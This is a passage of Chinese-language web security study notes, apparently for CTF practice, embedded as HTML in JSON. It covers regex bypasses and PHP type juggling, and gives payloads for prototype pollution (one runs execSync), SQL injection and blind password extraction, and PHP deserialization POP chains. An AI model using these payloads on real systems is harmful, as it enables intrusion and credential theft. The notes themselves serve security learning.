            "content_html": "<hr />\n<h1 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h1>\n<h2 id=\"报文\"><a class=\"anchor\" href=\"#报文\">#</a> 报文</h2>\n<ul>\n<li>\n<p><code>Referer从哪个页面的链接进入的这个页面</code></p>\n</li>\n<li>\n<p><code>X-Forwarded-For代理发送方（请求页面）的IP地址</code></p>\n</li>\n<li>\n<p><code>User-Agent识别发起请求的用户代理软件的应用类型、操作系统、软件开发商以及版本号</code></p>\n</li>\n<li>\n<p><code>Content-Type</code> : 内容类型</p>\n<ul>\n<li><code>application/x-www-form-urlencoded</code>  多用于 POST 传参，编码为 key/value 格式</li>\n<li><code>application/octet-stream</code>  二进制流，文件下载</li>\n</ul>\n</li>\n<li>\n<p><code>X-Real-IP实际服务器的 IP</code></p>\n</li>\n<li>\n<p><code>remote_addr上一个客户端服务器ip地址</code></p>\n</li>\n<li>\n<p><code>Connection标记请求连接是长连接还是短连接</code></p>\n</li>\n<li>\n<p><code>End-to-end 端到端头部转发给请求/响应 的最终接收目标</code></p>\n</li>\n</ul>\n<h2 id=\"指纹\"><a class=\"anchor\" href=\"#指纹\">#</a> 指纹</h2>\n<ol>\n<li><code>Wappalyzer</code>  插件、引擎 icon 分辨系统框架</li>\n</ol>\n<h2 id=\"其他\"><a class=\"anchor\" href=\"#其他\">#</a> 其他</h2>\n<ol>\n<li>打开控制台：F12，右键，浏览器更多 =&gt; 开发者工具，地址栏 F12，Ctrl+U</li>\n<li>/robots.txt</li>\n</ol>\n<h1 id=\"前端trick\"><a class=\"anchor\" href=\"#前端trick\">#</a> 前端 trick</h1>\n<p><strong>HTML</strong></p>\n<p>浏览器控制台修改添加 form 表单可以发送请求</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">enctype</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>multipart/form-data<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>post<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><strong>CSS</strong></p>\n<p><code>point-event:none</code>  禁止点击</p>\n<h1 id=\"绕过手法\"><a class=\"anchor\" href=\"#绕过手法\">#</a> 绕过手法</h1>\n<h2 id=\"正则\"><a class=\"anchor\" href=\"#正则\">#</a> 正则</h2>\n<ol>\n<li>\n<p>数组：处理非字符串返回 <code>false</code></p>\n</li>\n<li>\n<p><strong>PCRE 回溯次数限制</strong>：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vdXNlLXBjcmUtYmFja3RyYWNrLWxpbWl0LXRvLWJ5cGFzcy1yZXN0cmljdC5odG1s\">PHP 利用 PCRE 回溯次数限制绕过某些安全限制</span></p>\n<p>&lt;u&gt; 防止正则表达式的拒绝服务攻击 &lt;/u&gt;，对正则匹配过程中<strong>回溯次数</strong>进行限制，输入 <code>过长串</code> 可以 <code>超出</code> 回溯次数，返回 <code>false</code> ，与 <code>未匹配</code> 到规则返回 <code>0</code>  在 <code>布尔判断</code> 中效果相同（=== 抵御）</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">is_php</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/&lt;\\?.*[(`;?>].*/is'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// 布尔判断</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_php</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// fwrite($f, $input); ...</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure></li>\n<li>\n<p><strong>换行符</strong></p>\n<ul>\n<li><code>preg_match('/^.*(flag).*$/', input)</code> ： <code>.</code>  不匹配换行符，传入 <code>&quot;\\nflag&quot;</code>  即可</li>\n<li><code>preg_match('/^flag$/', input)</code> ：非多行模式， <code>$</code>  忽略在句尾的 <code>%0a</code></li>\n</ul>\n</li>\n</ol>\n<p><strong>PHP</strong></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>返回 匹配次数：<span class=\"token number\">0</span>或<span class=\"token number\">1</span>，第一次匹配后停止。如果发生错误<span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>返回<span class=\"token constant boolean\">FALSE</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>不同于此，匹配直到结尾。</pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">PHP</span>绕过特性<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token constant\">GET</span><span class=\"token operator\">/</span><span class=\"token constant\">POST</span>传入的变量名，若含有空格、<span class=\"token operator\">+</span>、<span class=\"token punctuation\">[</span>，则会被转化为<span class=\"token constant\">_</span>，但同时后面的字符就会被保留不被替换</pre></td></tr></table></figure><h2 id=\"科学计数法\"><a class=\"anchor\" href=\"#科学计数法\">#</a> 科学计数法</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 0 == 0 -> true</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"1\"</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"01\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 1 == 1 -> true</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"10\"</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"1e1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 10 == 10 -> true</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"1e2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 100 == 100 -> true</span></pre></td></tr></table></figure><h1 id=\"原型链污染\"><a class=\"anchor\" href=\"#原型链污染\">#</a> 原型链污染</h1>\n<h2 id=\"javascript\"><a class=\"anchor\" href=\"#javascript\">#</a> Javascript</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vamF2YXNjcmlwdC1wcm90b3R5cGUtcG9sbHV0aW9uLWF0dGFjay5odG1sIzB4MDEtcHJvdG90eXBlX19wcm90bw==\">深入理解 JavaScript Prototype 污染攻击</span>__</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZXNjYXBlLXcvcC8xMjM0NzcwNS5odG1s\">初探 JavaScript 原型链污染</span></p>\n<p><code>Javascript</code>  基于原型实现继承，本身无 class 实现（ <code>ES2015/ES6</code>  中引入了 class 关键字，语法糖）</p>\n<p>每个实例对象都有一个私有属性 <code>__proto__</code> 指向它的构造函数的原型 <code>prototype</code></p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>foo<span class=\"token punctuation\">.</span>__proto__ <span class=\"token operator\">==</span> <span class=\"token class-name\">Foo</span><span class=\"token punctuation\">.</span>prototype</pre></td></tr></table></figure><p>如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong></p>\n<p>&lt;img src=&quot;C:\\Users\\LENOVO\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240302194653012.png&quot; alt=&quot;image-20240302194653012&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>调用 test1.b，JavaScript 引擎会在对象 test1 中寻找 b，找不到，不断在 test1. <code>__proto__.__proto__.__proto__...</code>  中寻找 b，直到 <code>null</code>  结束， <code>Object.prototype</code>  的__proto__就是 null</p>\n<ul>\n<li>很多库最常见的控制键名的操作，也最能被原型链攻击，<strong>对象 merge</strong> 和<strong>对象 clone</strong></li>\n<li><code>JSON.parse('&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;')</code> ，传参需要 <code>json</code>  格式才可以解析 <code>__proto__</code> 为 “键名 key”，而不代表 “原型”</li>\n</ul>\n<p><strong>payload</strong></p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token string-property property\">\"__proto__\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token string-property property\">\"sourceURL\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"\\nreturn e=> &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load('child_process').execSync('id')&#125;\\n//\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"python\"><a class=\"anchor\" href=\"#python\">#</a> Python</h2>\n<p>与 JavaScript 类似，该攻击可以中实现对 <code>Python</code> <strong> 类属性值</strong>的污染，同时还能做到对<strong>全局变量中的属性</strong>实现污染</p>\n<h1 id=\"sql注入漏洞\"><a class=\"anchor\" href=\"#sql注入漏洞\">#</a> SQL 注入漏洞</h1>\n<p>URL 编码：%27 单引号，%20 空格</p>\n<p><strong>注入点</strong></p>\n<p>URL 参数，cookie 注入，UA 头</p>\n<p><strong>整体思路</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1.</span> 先加一个'看回显</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">2.</span> 数据包参数?xxx<span class=\"token operator\">=</span>aaa——后面加<span class=\"token string\">'and 1=1--+和'</span><span class=\"token keyword\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>或者<span class=\"token string\">'and '</span><span class=\"token number\">1</span><span class=\"token string\">'='</span><span class=\"token number\">1</span>和<span class=\"token string\">' and '</span><span class=\"token number\">1</span><span class=\"token string\">'='</span><span class=\"token number\">2</span>判断是否存在sql注入</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">3.</span> order by x<span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>判断列数</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">4.</span> <span class=\"token string\">'union select '</span>null<span class=\"token string\">','</span>null'<span class=\"token punctuation\">,</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>，要判别每一个（可能存在多种数据类型混合出现的情况）数据类型是数字型还是字符型——看有无回显判断是否成功注入，盲测可注入列数</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">5.</span> null位置替换成关键字进行查询（不同数据库方式不一样）<span class=\"token punctuation\">[</span>SQL injection cheat sheet <span class=\"token operator\">|</span> Web Security Academy<span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>https<span class=\"token punctuation\">:</span><span class=\"token operator\">//</span>portswigger<span class=\"token punctuation\">.</span>net<span class=\"token operator\">/</span>web<span class=\"token operator\">-</span>security<span class=\"token operator\">/</span>sql<span class=\"token operator\">-</span>injection<span class=\"token operator\">/</span>cheat<span class=\"token operator\">-</span>sheet<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token number\">1.</span>  用函数如version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>时，不能用引号</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   <span class=\"token number\">2.</span>  一个回显位回显多个username<span class=\"token operator\">|</span><span class=\"token operator\">|</span><span class=\"token string\">' '</span><span class=\"token operator\">|</span><span class=\"token operator\">|</span>password</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token number\">6.</span> 盲注Cookie<span class=\"token punctuation\">:</span> TrackingId<span class=\"token operator\">=</span>d2MRTvPQMnkzzv3q<span class=\"token string\">' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='</span>administrato<span class=\"token string\">r')='</span>§a§'<span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   <span class=\"token number\">1.</span>  集束炸弹遍历爆破</pre></td></tr></table></figure><p><strong>MYSQL 注入</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?a<span class=\"token operator\">=</span><span class=\"token number\">1</span>'<span class=\"token keyword\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>不用<span class=\"token keyword\">or</span>：参数<span class=\"token number\">1</span>存在，若用<span class=\"token keyword\">or</span>则布尔值恒真，需要用<span class=\"token keyword\">and</span>来带出变化<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>?a<span class=\"token operator\">=</span><span class=\"token number\">1</span>'<span class=\"token keyword\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>?a<span class=\"token operator\">=</span><span class=\"token number\">1</span>'order by <span class=\"token number\">3</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span> 经过测试这里的列是<span class=\"token number\">3</span>，<span class=\"token number\">4</span>就会报错说明没这么多</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>看回显位?a<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span>'union select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>?a<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span>'union select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>database<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span>  <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span>tables where table_schema<span class=\"token operator\">=</span><span class=\"token string\">\"test_db\"</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr></table></figure><p><strong>盲注 payload</strong></p>\n<p>爆破通过回显来说明是否存在</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>版本<span class=\"token string\">'and substring(@@version,1,1)=1='</span><span class=\"token number\">1</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>表名<span class=\"token string\">'AND (select 1 from \"******\" limit 0,1)=1+--'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>列名<span class=\"token string\">'AND (select substring(concat(1,user),1,1) from app_user limit 0,1)=1+--'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>字段值<span class=\"token string\">'AND ascii(substr((select password from app_user where id=xxx limit 1 offset 0),1,1))=101+--'</span></pre></td></tr></table></figure><h1 id=\"反序列化漏洞\"><a class=\"anchor\" href=\"#反序列化漏洞\">#</a> 反序列化漏洞</h1>\n<h2 id=\"php\"><a class=\"anchor\" href=\"#php\">#</a> PHP</h2>\n<p>历史版本下载 https://museum.php.net/</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vU2F5by0vcC8xNjA0MTYwMC5odG1s\">https://www.cnblogs.com/Sayo-/p/16041600.html</span></p>\n<p><strong>POP 链利用</strong>：找到头和尾，也就是用户能传入参数的地方（头）和最终要执行函数方法的地方（尾），之后反推，根据每个魔术方法的特性，从尾部（ <code>如getFlag()</code> ）向上判断每步的跳转位置，直到找到传参处，最后再按照正序编写整个 POP 链的对象构造过程</p>\n<p><strong>传入的数据类型多为字符串或者数组</strong></p>\n<ul>\n<li>数组形式设置 <code>$c=array($t,0);var_dump( serialize($c));</code> ，</li>\n<li>若使用 %00 进行正则绕过，需要用 <code>var_dump(urldecode(serialize($flag)));</code>  对 %00 进行 URL 编码，使得浏览器成功解析</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">// 创建对象时触发，反序列化不触发</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 对象被销毁时触发</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">// 使用 unserialize 时触发</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">__sleep</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 使用 serialize 时触发</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 在对象上下文中调用不可访问的方法时触发</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">__callStatic</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 在静态上下文中调用不可访问的方法时触发</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 用于从不可访问的属性读取数据</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">__set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 用于将数据写入不可访问的属性</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">__isset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 在不可访问的属性上调用 isset () 或 empty () 触发</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">__unset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 在不可访问的属性上使用 unset () 时触发</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 当脚本尝试将对象调用为函数时触发</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 把类当作字符串使用时触发</span></pre></td></tr></table></figure><p>绕过原文件设置的 <strong>WAF（ <code>例如throw new Exception()</code> ）</strong>：<strong>fast destruct</strong> 提前触发魔术方法，，本质是 <code>unserialize</code>  过程中扫描器发现序列化字符串格式有误从而导致提前异常退出，为了销毁之前建立的对象内存空间，会立刻调用对象的 <code>__destruct()</code> ，提前触发反序列化链条。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#修改序列化数字元素个数</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a<span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">7</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"myclass\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Hello\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"qwb\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"/flag\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#去掉序列化尾部 &#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>a<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">7</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"myclass\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Hello\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"qwb\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"/flag\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><strong>payload 举例</strong>（2023 陕西省大学生网安大赛）</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">night</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$night</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">day</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$day</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">dark</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$dark</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">light</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$light</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$t</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">night</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$t</span><span class=\"token operator\">-></span><span class=\"token property\">night</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">day</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$t</span><span class=\"token operator\">-></span><span class=\"token property\">night</span><span class=\"token operator\">-></span><span class=\"token property\">day</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">dark</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td 